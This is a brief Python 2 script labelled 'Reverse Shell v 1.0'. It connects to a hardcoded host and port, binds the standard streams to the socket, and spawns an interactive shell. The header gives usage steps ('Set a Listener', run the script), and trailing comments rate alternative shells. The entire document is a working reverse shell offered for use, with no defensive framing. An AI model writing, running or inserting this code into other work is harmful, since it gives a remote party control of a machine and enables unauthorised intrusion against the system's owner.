#!/usr/bin/python
#
# Reverse Shell v 1.0
# Python 2.7.x
# It connects to Host & Port
# First of all, Set a Listener
# Second run ./ReverSheller.py
# Enjoy It :)

import socket
import os
import sys
import subprocess
from pty import*

rhost = '192.168.230.21' # Set here different Host to connect
rport =  443             # Set here different Port to connect

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket_Variable
s.connect((rhost , rport))                            # Socket_Connection

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

shell = subprocess.call(["/bin/wish", "-i"]) # Set here different Shell_Environment
                                             # Shell set on "/bin/wish Interactive"

#       < Shell Environment Supported >
# ash
# bash "Good interactive"
# dash "Bad"
# ksh
# zsh  "Bad"
# csh
# es
# fish
# rc   "Excellent"
# scsh "Excellent"
# wish "Excellent"
